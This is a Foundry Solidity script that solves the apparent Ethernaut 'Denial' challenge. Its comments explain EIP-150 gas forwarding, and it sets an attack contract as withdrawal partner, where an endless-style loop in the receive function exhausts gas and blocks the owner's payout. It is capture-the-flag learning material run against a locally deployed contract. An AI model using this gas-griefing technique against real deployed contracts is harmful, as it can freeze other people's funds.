// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Denial} from "../src/Denial.sol";

contract DenailSolution is Script {
    // $ forge script script/Denail.s.sol --tc DenailSolution -vvvv

    Denial denailInstance;
    DenialAttack attackContract;

    function run() external {
        // Deploy `Denial` contract
        denailInstance = new Denial();

        (bool success,) = payable(address(denailInstance)).call{value: 1 ether}("");
        require(success, "Failed to deposite to Denial");

        // - The idea of the challenge is to prevent the owner from taking receiving money.
        // - In the `withdraw` function, we are first sending ETH to the partner using the low-level call method. Then, we send ETH to the owner using the built-in `transfer` function.
        // - When making the low-level `call` function we are forwarding 63/64 of the total gas sent in the transaction, you can read more about this in EIP-150.
        // - So the gas that will be forwarded to the partner address equals 1000000 * 63/64 = 984375 (The TX is for 1M gas or less as in the CTF write).
        // - So If we took all the gas that will be forwarded to the `partner` (984375). The remaining gas will be 1000000 - 984375 = 15625.
        // - 15625 gas will not be enough for the withdraw function logic, which will make the TX run out of gas.

        // - So we need to spend out all the gas that will passed to us, to path this challenge.
        // - We will make a contract and add a for loop that loops 1 Million iterations in `receive` function.
        // - We know that when a Smart Contract receives money, it fires `receive` function, and the for loop will consume all the gas.
        // - So by doing this, we will prevent the owner from receiving funds, as the TX will run out of gas. And we will pass the challenge.

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        attackContract = new DenialAttack();

        // setting partner to the `DenialAttack` contract
        denailInstance.setWithdrawPartner(address(attackContract));
        // calling `withdraw` function by forwarding 1 M gas, as stated in the challenge
        denailInstance.withdraw{gas: 1_000_000}();

        // We will not reach this line, as the tx will run out of gas
        console.log("Owner Balance:", denailInstance.owner().balance);
    }
}

contract DenialAttack {
    receive() external payable {
        for (uint256 i = 0; i < 1_000_000; i++) {}
    }
}
